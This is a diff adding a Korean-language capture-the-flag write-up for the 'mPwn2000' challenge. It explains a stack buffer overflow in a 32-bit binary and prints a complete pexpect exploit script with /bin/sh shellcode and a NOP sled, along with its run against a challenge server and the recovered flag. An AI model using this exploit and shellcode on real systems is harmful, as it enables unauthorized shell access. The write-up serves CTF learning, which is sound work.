@@ -788,6 +788,171 @@ flag = ISCTF{I don't need to match them :)}
 
 ## mPwn2000
 
+### 요약
+
+````
+ied206@TS140  ~/ISCTF/mpwn2000
+$ wget http://45.63.124.167/files/mpwn2000
+ied206@TS140  ~/ISCTF/mpwn2000
+$ chmod +x mpwn2000
+ied206@TS140  ~/ISCTF/mpwn2000
+$ vim expect.py
+ied206@TS140  ~/ISCTF/mpwn2000
+$ cat expect.py
+#!/usr/bin/env python3
+
+import pexpect
+import sys
+
+p = pexpect.spawn(sys.argv[1])
+
+opts = [ "Address of buf is : 0x([a-f0-9]+)\r\nInput your message : ",
+          pexpect.EOF ]
+
+while True:
+    index = p.expect(opts, timeout=3)
+    if index == 0:
+        address = int(p.match.group(1), 16).to_bytes(4, byteorder='little')
+        shellcode = b'\x90'*36 +  b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' +  b'\x00\xe1\xd7\xFF'
+        shellcode = shellcode + address
+        print(shellcode)
+        p.send(shellcode)
+        p.interact()
+
+ied206@TS140  ~/ISCTF/mpwn2000
+$ ./expect.py 'nc 45.32.46.195 10100'                                                                                           1 ↵
+b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x901\xc0Ph//shh/bin\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x801\xc0@\xcd\x80\x00\xe1\xd7\xff\xe8'\xa1\xff"
+1󿿐h//shh/bin㊁°^K̀1󿿀̀^@☿槡ÿ
+
+your message is 1󿿐h//shh/bin㊁°
+                               ̀1󿿀̀
+cat /home/mpwn2000/flag
+ISCTF{Jmp to sh311c0de!!}
+````
+
+### 풀이
+
+mpwn2000 바이너리 내에서 컴파일러 stub을 제외하면, main 함수만이 존재한다.
+
+Main 내의 코드는 다음과 같다.
+
+````
+(gdb) disas main
+Dump of assembler code for function main:
+   0x080484bb <+0>:	push   %ebp
+   0x080484bc <+1>:	mov    %esp,%ebp
+   0x080484be <+3>:	sub    $0x40,%esp
+   0x080484c1 <+6>:	mov    0x804a040,%eax
+   0x080484c6 <+11>:	push   $0x0
+   0x080484c8 <+13>:	push   %eax
+   0x080484c9 <+14>:	call   0x8048370 <setbuf@plt>
+   0x080484ce <+19>:	add    $0x8,%esp
+   0x080484d1 <+22>:	mov    0x804a044,%eax
+   0x080484d6 <+27>:	push   $0x0
+   0x080484d8 <+29>:	push   %eax
+   0x080484d9 <+30>:	call   0x8048370 <setbuf@plt>
+   0x080484de <+35>:	add    $0x8,%esp
+   0x080484e1 <+38>:	lea    -0x40(%ebp),%eax
+   0x080484e4 <+41>:	push   %eax
+   0x080484e5 <+42>:	push   $0x80485b0
+   0x080484ea <+47>:	call   0x8048390 <printf@plt>
+   0x080484ef <+52>:	add    $0x8,%esp
+   0x080484f2 <+55>:	push   $0x80485c8
+   0x080484f7 <+60>:	call   0x8048390 <printf@plt>
+   0x080484fc <+65>:	add    $0x4,%esp
+   0x080484ff <+68>:	push   $0x80
+   0x08048504 <+73>:	lea    -0x40(%ebp),%eax
+   0x08048507 <+76>:	push   %eax
+   0x08048508 <+77>:	push   $0x0
+   0x0804850a <+79>:	call   0x8048380 <read@plt>
+   0x0804850f <+84>:	add    $0xc,%esp
+   0x08048512 <+87>:	lea    -0x40(%ebp),%eax
+   0x08048515 <+90>:	push   %eax
+   0x08048516 <+91>:	push   $0x80485de
+   0x0804851b <+96>:	call   0x8048390 <printf@plt>
+   0x08048520 <+101>:	add    $0x8,%esp
+   0x08048523 <+104>:	mov    $0x0,%eax
+   0x08048528 <+109>:	leave
+   0x08048529 <+110>:	ret
+End of assembler dump.
+````
+
+main 내에는 uint8_t buf[0x40]이 존재하고, read로 binary를 읽어들인다.
+이 때, read의 길이는 0x80으로 지정되어 있어 BOF가 가능하다.
+
+buf + exEBP + return address 순으로 main의 스택 프레임이 구성되어 있으므로, buf + exEBP를 합친 68B 내에 쉘코드를 집어넣은 후, return address는 buf의 시작 주소를 주면 된다.
+
+이 때 buf의 시작 주소는 매번 변하는 문제가 있으나, mpwn2000은 buf의 주소를 stdout에 출력해준다. 따라서 이 문제를 풀기 위해선 이 값을 읽은 뒤 동적으로 쉘코드에 주소를 삽입하여 stdin에 넣어줘야 한다. 이를 위해 python의 pexpect 모듈을 사용한다.
+먼저, /bin/sh을 호출하는 28B 쉘코드를 준비한다.
+
+````
+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
+````
+
+NOP Sled의 효과를 내고, 64B에 맞춰 패딩을 하기 위해 앞에 36B의 NOP을 붙인다. 또한, 뒤에 exEBP 자리에 들어갈 더미값 4바이트도 붙인다.
+
+````
+#!/usr/bin/env python3
+shellcode = b'\x90'*36 +  b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' +  b'\x00\xe1\xd7\xFF'
+````
+
+stdout에서 출력해주는 buf의 주소를 읽은 뒤, 이를 쉘코드 맨 뒤에 붙인다.
+
+````
+#!/usr/bin/env python3
+# buf’s address captured in p.match.group(1)
+address = int(p.match.group(1), 16).to_bytes(4, byteorder='little')
+shellcode = shellcode + address
+````
+
+mpwn2000의 stdin과 stdout을 통제하기 위해 python의 pexpect 모듈을 사용한다.
+출력된 buf의 주소를 찾은 뒤 쉘코드를 생성하고, 이후부터는 stdin과 stdout을 정상적인 상태처럼 쉘로 보내 /bin/sh을 내가 조작할 수 있도록 한다.
+문제풀이에 사용한 코드는 다음과 같다.
+
+````
+ied206@TS140  ~/ISCTF/mpwn2000
+$ cat expect.py
+#!/usr/bin/env python3
+
+import pexpect
+import sys
+
+p = pexpect.spawn(sys.argv[1])
+
+opts = [ "Address of buf is : 0x([a-f0-9]+)\r\nInput your message : ",
+          pexpect.EOF ]
+
+while True:
+    index = p.expect(opts, timeout=3)
+    if index == 0:
+        address = int(p.match.group(1), 16).to_bytes(4, byteorder='little')
+        shellcode = b'\x90'*36 +  b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' +  b'\x00\xe1\xd7\xFF'
+        shellcode = shellcode + address
+        print(shellcode)
+        p.send(shellcode)
+        p.interact()
+````
+
+이를 실행하면 다음 결과를 얻을 수 있다.
+
+````
+ied206@TS140  ~/ISCTF/mpwn2000
+$ ./expect.py 'nc 45.32.46.195 10100'
+b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x901\xc0Ph//shh/bin\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x801\xc0@\xcd\x80\x00\xe1\xd7\xff\xe8'\xa1\xff"
+1󿿐h//shh/bin㊁°^K̀1󿿀̀^@☿槡ÿ
+
+your message is 1󿿐h//shh/bin㊁°
+                               ̀1󿿀̀
+cat /home/mpwn2000/flag
+ISCTF{Jmp to sh311c0de!!}
+````
+
+### Answer flag
+
+````
+ISCTF{Jmp to sh311c0de!!}
+````
+
 ## mPwn2300
 
 ## Misc2000
